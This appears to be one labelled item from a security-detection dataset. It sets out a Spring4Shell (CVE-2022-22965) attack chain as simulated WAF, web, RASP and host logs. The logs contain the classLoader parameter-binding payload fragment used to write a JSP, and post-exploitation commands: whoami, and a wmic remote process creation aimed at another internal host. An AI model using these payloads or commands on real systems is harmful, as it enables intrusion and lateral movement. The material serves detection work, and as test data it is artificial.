@@ -1,0 +1,57 @@
+{
+ "unit": 1073,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-002",
+  "confidence": "low",
+  "needs_review": true,
+  "reason": "关键词命中家族，但阶段结构未核实"
+ },
+ "technique": "Spring4Shell 参数绑定 Tomcat 日志写入 JSP (CVE-2022-22965)",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 01:18:34",
+   "source": "waf",
+   "log_id": "WAF0304216",
+   "content": "/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct",
+   "event_id": "1073-WAF0304216"
+  },
+  {
+   "timestamp": "2026-06-16 01:18:35",
+   "source": "web",
+   "log_id": "WEB0306196",
+   "content": "/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct",
+   "event_id": "1073-WEB0306196"
+  },
+  {
+   "timestamp": "2026-06-16 01:18:37",
+   "source": "rasp",
+   "log_id": "RASP0336580",
+   "content": "https://app-spring-141.ops-corp.com/api/v3/export {\"spring4shell\": \"pipeline.first.prefix\", \"dir\": \"webapps/RO",
+   "event_id": "1073-RASP0336580"
+  },
+  {
+   "timestamp": "2026-06-16 01:19:39",
+   "source": "hids",
+   "log_id": "HID0329683",
+   "content": "whoami C:\\Windows\\System32\\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\\app\\export.jar",
+   "event_id": "1073-HID0329683"
+  },
+  {
+   "timestamp": "2026-06-16 01:21:03",
+   "source": "hids",
+   "log_id": "HID0329691",
+   "content": "wmic /node:10.20.10.62 process call create \"cmd.exe /c whoami\" cmd.exe cmd.exe /c wmic /node:10.20.10.62 <== s",
+   "event_id": "1073-HID0329691"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
